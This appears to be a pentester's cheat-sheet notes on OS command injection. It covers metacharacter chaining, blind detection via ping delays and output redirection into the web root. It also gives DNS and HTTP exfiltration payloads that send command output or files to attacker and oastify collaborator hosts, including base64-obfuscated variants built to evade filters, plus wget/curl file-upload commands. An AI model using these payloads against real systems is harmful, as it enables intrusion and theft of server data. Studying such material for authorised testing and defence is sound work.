![[OS Command Injection.jpg]]

# Recon

First step is to perform app mapping and identify any instances where the app appears to be interacting with the underlying OS by calling external processes or accessing the file system. The app may issue OS system commands containing any item of user supplied data (every URL, parameters, cookies, etc..).

It is recommended to probe all these instances for OS command injection.
# Background Knowledge

The characters `;`, `|` and `&` and newline `%0a` can be used to batch multiple commands one after another. Each of these characters should be used when probing for command injection vulnerabilities, as the app may reject some inputs but accept others.

The backtick \` character can also be used to encapsulate a separate command within a data item being processed by the original command. This will cause the interpreter to execute this command first before continuing to execute the remaining command string:

```bash
nslookup `whoami`.server-you-control.net
```

>[!info]
>Note that the different shell metacharacters have subtly different behaviours that may affect whether they work in certain situations, and whether they allow in-band retrieval of command output or are useful for blind exploitation.

Sometimes, the input that you control appears within quotation marks in the original command. In this situation, you need to terminate the quoted context (using " or ') before using suitable shell metacharacters to inject a new command.
# Example

Many times the injected characters need to be encoded, since they can interfere with the structure of the URL/body parameters. For example, the & and space characters may need to be URL encoded (%26 and %20) in order to be treated as part of the injection payload.
# Simple Command Injection

```bash
& echo test123 &
```
# Blind Command Injection

Many times, the results of the injected commands are not returned in the applications responses. If that is the case, you can use the ping command to trigger a time delay in the app's response by causing the server to ping its loopback interface for a specific time period.

To maximize chances of identifying OS command injection if the app is filtering certain command separators, submit each of the following to each input fields and analyse the time taken for the app to respond:

```bash
| ping -i 30 127.0.0.1 |
| ping -n 30 127.0.0.1 |
& ping -i 30 127.0.0.1 &
& ping -n 30 127.0.0.1 &
; ping -i 30 127.0.0.1 ;
%0a ping -i 30 127.0.0.1 %0a
` ping 127.0.0.1 `
```
# Output Redirection

You can also redirect a command output to a file using the `>` character. The below example redirects the output of the OS command to a file within the web root, then you can access the file to view the contents through the browser:

```bash
; whoami > /var/www/images/test;
```
# Reverse Shells

- https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
# DNS Data Exfiltration

Using backticks and `$command`:

```bash
; nslookup $(whoami).attacker-server.net ;
; nslookup `whoami`.attacker-server.net ;
```
# Obfuscation Payloads

The goal here is to learn how the following payload can be obfuscated to bypass filters for data exfiltration. The payloads can be combined when exploiting template injection or other vulnerabilities that use OS command injection.

Original payload:

```bash
||nslookup+$(cat+/etc/hostname).fp8v70vp.oastify.com||
```

Obfuscation using the "echo" command to help obfuscate the word "hostname":

```bash
||nslookup+$(cat+/etc/ho`echo+'stname'`).fp8w54v70vp.oastify.com||
```

Obfuscation using base64 to hide the file name:

```bash
||nslookup+$(cat+`echo+'L2V0Yy9ob3N0bmFtZQ=='+|+base64+--decode`).fp8v70vp.oastify.com||
```

Decoded payload:

```bash
||nslookup $(cat `echo 'L2V0Yy9ob3N0bmFtZQ==' | base64 --decode`).fp8w70vp.oastify.com||
```

Obfuscation using base encoding to hide the whole command:

```bash
||nslookup+$(`echo+'Y2F0IC9ldGMvaG9zdG5hbWU='+|+base64+--decode`).er9v70tk9lz9o.oastify.com||
```
# Other Methods

Some other methods to achieve data exfiltration include:

```bash
nslookup -q=cname $(cat /home/test).burp.oastify.com
wget http://burp-collab.com --post-file=/home/test
curl http://wcq0jo8.oastify.com -d @/home/test
```

